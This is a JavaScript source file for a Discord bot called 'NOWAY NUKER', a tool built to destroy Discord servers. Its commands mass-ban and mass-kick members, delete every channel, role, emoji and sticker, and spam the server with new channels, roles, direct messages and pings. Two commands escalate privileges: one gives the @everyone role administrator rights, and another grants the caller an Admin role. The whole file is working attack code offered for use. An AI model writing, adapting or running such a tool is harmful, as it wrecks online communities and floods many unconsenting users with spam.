console.clear();
require('events').defaultMaxListeners = 15;
const  Discord  = require('discord.js');
const config = require('./JSON/config.json')
const { red, greenBright, cyan, yellow } = require("chalk");

const readline = require("readline");

const client = new Discord.Client({

    restTimeOffset: 0,
    allowedMentions: {
        parse: ["roles", "users", "everyone" ],
        repliedUser: false,
    },
    intents: 32767,
    partials: ["USER", "CHANNEL", "MESSAGE", "GUILD_MEMBER", "REACTION"],
  
    intents: [
        Discord.Intents.FLAGS.GUILDS,
        Discord.Intents.FLAGS.GUILD_MEMBERS,
        Discord.Intents.FLAGS.GUILD_BANS,
        Discord.Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS,
        Discord.Intents.FLAGS.GUILD_INTEGRATIONS,
        Discord.Intents.FLAGS.GUILD_WEBHOOKS,
        Discord.Intents.FLAGS.GUILD_INVITES,
        Discord.Intents.FLAGS.GUILD_VOICE_STATES,
        // Discord.Intents.FLAGS.GUILD_PRESENCES,
        Discord.Intents.FLAGS.GUILD_MESSAGES,
        Discord.Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
        Discord.Intents.FLAGS.GUILD_MESSAGE_TYPING,
        Discord.Intents.FLAGS.DIRECT_MESSAGES,
        Discord.Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
        Discord.Intents.FLAGS.DIRECT_MESSAGE_TYPING,
    ],
    partials: ["CHANNEL"],
    // ws: { properties: { $browser: "Discord iOS" }},
    disableEveryone: false,
    partials: ["USER", "CHANNEL", "MESSAGE", "GUILD_MEMBERS", "REACTION"]
});


console.log(red('-----------------------------NOWAY NUKER BY PETER & PATOHRU-----------------------------'))
console.log(yellow('|                               Last Update: 21/3/2022                                 |'))
console.log(yellow('|                                     Prefix: ?                                        |'))
console.log(red('|                                                                                      |'))
console.log(red('|                                                                                      |'))
console.log(red('|                                                                                      |'))
console.log(greenBright('----------------------------------------------------------------------------------------'))
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});




const prefix = '?'


client.on('ready', async (client) => {
    console.clear();
    client.user.setActivity(config.playing, { type: 'PLAYING' })
    console.log(red('-----------------------------NOWAY NUKER BY PETER & PATOHRU-----------------------------'))
    console.log(red('|                           **************INFO**************                           |'))
    console.log(yellow('|                               Last Update: 21/3/2022                                 |'))
    console.log(yellow(`|                                     Prefix: ${prefix}                                        |`))
    console.log(yellow(`|                                  Bot name: ${client.user.username}                                      |`))
    console.log(yellow(`|                                  Total Guilds: ${client.guilds.cache.size}                                     |`))
    console.log(red('|                                                                                      |'))
    console.log(red('|                          *************Features*************                          |'))
    console.log(greenBright(`|     ${prefix}masschannel | ${prefix}massban | ${prefix}massdeletechannel | ${prefix}massdeleterole | | ${prefix}killemoji    |`))
    console.log(greenBright(`|          ${prefix}killsticker | ${prefix}everyoneAdmin | ${prefix}giveAdmin | ${prefix}massPing | | ${prefix}massKick        |`))
    console.log(greenBright(`|                                ${prefix}massdm | ${prefix}massrole | ${prefix}stop                           |`))
    console.log(greenBright('----------------------------------------------------------------------------------------'))
})


client.on('messageCreate', async (message, err) => {
    if (err) return
    const args = message.content.split(" ").slice(1);
    if (message.content.startsWith(`${prefix}masschannel`)){
        message.delete()

        const amount = args[0]
        const channelName = args.slice(1).join("")
    
        for (let i = 0; i < amount; i++) {
            const name = channelName || 'Noway-nuker'
            if (message.guild.channels.cache.size === 500) break;
            message.guild.channels.create(name, { type: "GUILD_TEXT" })
            console.log(greenBright(`[Success] Created channel: ${name}!`))
        }
        return console.log(yellow((`[Success] Finished task!`)))
    }
    
    else if (message.content.startsWith(`${prefix}massban`)){
        message.delete()

        message.guild.members.cache.forEach(user => {
            if (user.bannable){
                user.ban('No way nuke').catch(e=>{console.log(red(`[ERR] Can't ban ${user.user.username}!`))})
                console.log(greenBright(`[Success] Banned ${user.user.username}!`))
            }else{
                console.log(red(`[ERR] Can't ban ${user.user.username}!`))
            }
        })
        return console.log(yellow((`[Success] Finished task!`)))
    }

    else if (message.content.startsWith(`${prefix}massdeletechannel`)){
        message.guild.channels.cache.forEach(channel => {
            if (channel.deletable){                
                channel.delete().catch(e=>{console.log(red(`[ERR] Can't delete channel: ${channel.name}!`))})
                console.log(greenBright(`[Success] Deleted channel: ${channel.name}!`))
            } else {    
                console.log(red(`[ERR] Can't delete channel: ${channel.name}!`))
            }
        })
        return console.log(yellow((`[Success] Finished task!`)))
    }
    else if (message.content.startsWith(`${prefix}massdm`)){
        message.delete()
        const amount = args[0]
        const content = args.slice(1).join("")
        for (let i = 0; i < amount; i++) {
            message.guild.members.cache.forEach(member => {
                member.send(`${content}`).catch(e=>{console.log(red(`[ERR] Can't DMs to: ${member.user.username}!`))})
                console.log(greenBright(`[Success] Sent message to ${member.user.username}!`))
            });
            
        }
        return console.log(yellow((`[Success] Finished task!`)))
    }
    else if (message.content.startsWith(`${prefix}massdeleterole`)){
        message.delete()

        message.guild.roles.cache.forEach(role => {
            if (role.editable){
                role.delete().catch(e=>{console.log(red(`[ERR] Can't delete role: ${role.name}!`))})
                
                console.log(greenBright(`[Success] Deleted role: ${role.name}!`))
            } else {
                console.log(red(`[ERR] Can't delete role: ${role.name}!`))
            }
        })
        return console.log(yellow((`[Success] Finished task!`)))
    }
    else if (message.content.startsWith(`${prefix}massrole`)){
        message.delete()

        const amount = args[0]
        const roleName = args.slice(1).join("")

        for (let i = 0; i < amount; i++) {
            const name = roleName || 'Noway nuker'
            if (message.guild.roles.cache.size === 250) break;
            message.guild.roles.create({ name: name, color: "RANDOM", position: i++ })
            console.log(greenBright(`[Success] Created role: ${name}!`))
        }
        return console.log(yellow((`[Success] Finished task!`)))
    }
    else if (message.content.startsWith(`${prefix}killemoji`)){
        message.delete()
        message.guild.emojis.cache.forEach(e => {
            e.delete().catch(e=>{console.log(red(`[ERR] Can't delete emoji: ${e.name}!`))})
            console.log(greenBright(`[Success] Deleted emoji: ${e.name}!`))
        })
        return console.log(yellow((`[Success] Finished task!`)))
    }
    else if (message.content.startsWith(`${prefix}killsticker`)){
        message.delete()
        message.guild.stickers.cache.forEach(e => {
            e.delete().catch(e=>{console.log(red(`[ERR] Can't delete sticker: ${e.name}!`))})
            console.log(greenBright(`[Success] Deleted sticker: ${e.name}!`))
        })
        return console.log(yellow((`[Success] Finished task!`)))
    }
    else if (message.content.startsWith(`${prefix}everyoneAdmin`)){
        message.delete()

        const everyone = await message.guild.roles.cache.find((role) => role.name === "@everyone")
        everyone.setPermissions(["ADMINISTRATOR"]).catch(e=>{console.log(red(`[ERR] Can't grant ADMINSTRATOR permission to everyone!`))})
        console.log(greenBright(`[Success] Granted admin permission to everyone role!`))
        return console.log(yellow((`[Success] Finished task!`)))
    }
    else if (message.content.startsWith(`${prefix}giveAdmin`)){
        message.delete()
        const role = await message.guild.roles.create({
            name : "Admin",
            permissions: ["ADMINISTRATOR"]
        }).catch(e=>{console.log(red(`[ERR] Can't create Admin role!`))})
        console.log(greenBright(`[Success] Created role: ${role.name}!`))
    
    
        message.guild.members.cache.get(message.author.id).roles.add(role).catch(e=>{console.log(red(`[ERR] Can't add Admin role to ${message.author.username}!`))})
        console.log(greenBright(`[Success] Added role ${role.name} to ${message.author.username}!`))
        return console.log(yellow((`[Success] Finished task!`)))
    }
    else if (message.content.startsWith(`${prefix}massPing`)){
        message.delete()

        const amount = args[0]
        const content = args.slice(1).join("")
    
        for (let i = 0; i < amount; i++) {
            message.guild.channels.cache.forEach(async (channel) => {
                await channel.send(content).catch(e=>{console.log(red(`[ERR] Can't send to channel: ${channel.name}!`))})
                return console.log(greenBright(`[Success] Spamming channel ${channel.name}!`))
            })
        }
    }
    else if (message.content.startsWith(`${prefix}massKick`)){
        message.delete()
        message.guild.members.cache.forEach(user => {
            if (user.kickable){
                user.kick('No way nuke').catch(e=>{console.log(red(`[ERR] Can't kick ${user.user.username}!`))})
                console.log(greenBright(`[Success] Kicked ${user.user.username}!`))
            }else{
                console.log(red(`[ERR] Can't kick ${user.user.username}!`))
            }
        })
        return console.log(yellow((`[Success] Finished task!`)))
    }
    else if (message.content.startsWith == `${prefix}stop`){
        process.exit()
    }
    
})
rl.question("Enter bot token: ", function (token) {
    client.login(token).catch(e=>{
        console.log(red(`[ERR] Wrong token!`))
        rl.question("Enter bot token: ", function (token) {
            client.login(token).catch(e=>{console.log(red(`[ERR] Wrong token!`))})
            rl.close();
        });
    })
    rl.close();
});


